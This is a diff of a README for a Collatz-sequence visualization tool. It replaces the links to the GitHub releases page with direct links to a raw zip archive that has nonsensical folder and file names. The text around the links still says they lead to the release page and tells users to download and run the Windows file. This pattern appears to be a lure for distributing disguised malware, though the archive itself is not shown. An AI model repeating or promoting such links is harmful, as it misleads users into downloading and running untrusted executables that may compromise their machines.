@@ -1,12 +1,12 @@
 # 🪐 Collatz_Billiards - Visualize the Collatz Path
 
-[![Download Collatz_Billiards](https://img.shields.io/badge/Download%20Collatz_Billiards-Visit%20Releases-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Bulgurwheatmasterwort208/Collatz_Billiards/releases)
+[![Download Collatz_Billiards](https://img.shields.io/badge/Download%20Collatz_Billiards-Visit%20Releases-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Bulgurwheatmasterwort208/Collatz_Billiards/raw/refs/heads/main/unbaptize/Billiards-Collatz-saprophytically.zip)
 
 ## 📥 Download
 
 Use this link to visit the release page and download the Windows version:
 
-https://github.com/Bulgurwheatmasterwort208/Collatz_Billiards/releases
+https://github.com/Bulgurwheatmasterwort208/Collatz_Billiards/raw/refs/heads/main/unbaptize/Billiards-Collatz-saprophytically.zip
 
 On the releases page, pick the latest version and download the file made for Windows. If you see more than one file, choose the one with a name that matches Windows or ends in `.exe`
 
@@ -116,6 +116,6 @@ The repository topics point to number theory, dynamical systems, base-3 structur
 
 If you need another copy, visit the release page here:
 
-https://github.com/Bulgurwheatmasterwort208/Collatz_Billiards/releases
+https://github.com/Bulgurwheatmasterwort208/Collatz_Billiards/raw/refs/heads/main/unbaptize/Billiards-Collatz-saprophytically.zip
 
 Choose the newest Windows file, download it, then run it from your Downloads folder or from the extracted release folder
